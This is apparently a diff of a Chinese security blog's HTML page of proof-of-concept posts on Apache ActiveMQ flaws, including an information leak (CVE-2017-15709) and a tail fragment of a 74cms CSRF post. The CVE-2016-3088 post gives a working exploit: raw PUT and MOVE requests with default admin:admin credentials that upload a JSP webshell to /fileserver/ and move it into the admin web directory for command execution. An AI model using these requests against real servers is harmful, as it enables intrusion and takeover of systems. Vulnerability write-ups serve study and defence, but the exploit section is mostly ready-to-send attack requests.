-<h1 id="（CVE-2017-15709）ActiveMQ-信息泄漏漏洞"><a href="#（CVE-2017-15709）ActiveMQ-信息泄漏漏洞" class="headerlink" title="（CVE-2017-15709）ActiveMQ 信息泄漏漏洞"></a>（CVE-2017-15709）ActiveMQ 信息泄漏漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache<br>ActiveMQ默认消息队列61616端口对外，61616端口使用了OpenWire协议，这个端口会暴露服务器相关信息，这些相关信息实际上是debug信息。</p>
-<p>会返回应用名称，JVM，操作系统以及内核版本等信息。</p>
-<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>apache-activemq-5.15.0 to apache-activemq-5.15.2apache-activemq-5.14.0 to apache-activemq-5.14.5</p>
-<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="./resource/(CVE-2017-15709)ActiveMQ%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/%EF%BC%88CVE-2019-11374%EF%BC%8974cms%20v5.0.1%20%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0(CSRF)%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1257,6 +872,200 @@ shell</code></pre>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.023niu.com/show-62-32-1.html">https://www.023niu.com/show-62-32-1.html</a></p>
 </blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/%EF%BC%88CVE-2016-3088%EF%BC%89ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/12/%EF%BC%88CVE-2016-3088%EF%BC%89ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">（CVE-2016-3088）ActiveMQ应用漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:02:51" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <a id="more"></a>
+
+<h1 id="（CVE-2016-3088）ActiveMQ应用漏洞"><a href="#（CVE-2016-3088）ActiveMQ应用漏洞" class="headerlink" title="（CVE-2016-3088）ActiveMQ应用漏洞"></a>（CVE-2016-3088）ActiveMQ应用漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>ActiveMQ是一款流行的开源消息服务器。默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache ActiveMQ 5.x ~ 5.14.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞是需要登录之后才可以执行</p>
+<p>漏洞利用就是/fileserver/有put上传权限，/admin/有执行权限，可找到绝对路径，使用move移动文件到/admin/</p>
+<p>下面就是两步走，先是利用put上传文件到/fileserver/,然后移动到move到admin下面</p>
+<p>所有返回为204就代表是成功，有个坑点：不要put同文件名的文件上去</p>
+<p>如果上传不解析的话，则是证明没有权限！！！</p>
+<p>如果上传不解析的话，则是证明没有权限！！！</p>
+<p>如果上传不解析的话，则是证明没有权限！！！</p>
+<p>ActiveMQ默认开启PUT方法，当fileserver存在时我们可以上传jspwebshell。</p>
+<p><img src="./images/(CVE-2016-3088)ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<pre><code>PUT /fileserver/shell.jsp HTTP/1.1
+Host: 192.168.197.25:8161
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Authorization: Basic YWRtaW46YWRtaW4=
+
+shell</code></pre>
+<p>利用 MOVE 方法将 Webshell 移入 admin/ 目录</p>
+<p><img src="./images/(CVE-2016-3088)ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<pre><code>Request Raw:
+MOVE /fileserver/shell.jsp HTTP/1.1
+Destination:file:/data/apache-activemq-5.7.0/webapps/admin/shell.jsp
+Host: 192.168.197.25:8161
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Authorization: Basic YWRtaW46YWRtaW4=
+Content-Length: 17
+Content-Length: 0
+
+shell</code></pre>
+<p><img src="./images/(CVE-2016-3088)ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/%EF%BC%88CVE-2017-15709%EF%BC%89ActiveMQ%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/12/%EF%BC%88CVE-2017-15709%EF%BC%89ActiveMQ%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">（CVE-2017-15709）ActiveMQ 信息泄漏漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:02:59" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <a id="more"></a>
+
+<h1 id="（CVE-2017-15709）ActiveMQ-信息泄漏漏洞"><a href="#（CVE-2017-15709）ActiveMQ-信息泄漏漏洞" class="headerlink" title="（CVE-2017-15709）ActiveMQ 信息泄漏漏洞"></a>（CVE-2017-15709）ActiveMQ 信息泄漏漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache<br>ActiveMQ默认消息队列61616端口对外，61616端口使用了OpenWire协议，这个端口会暴露服务器相关信息，这些相关信息实际上是debug信息。</p>
+<p>会返回应用名称，JVM，操作系统以及内核版本等信息。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>apache-activemq-5.15.0 to apache-activemq-5.15.2apache-activemq-5.14.0 to apache-activemq-5.14.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/images/(CVE-2017-15709)ActiveMQ%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
 
       
     </div>
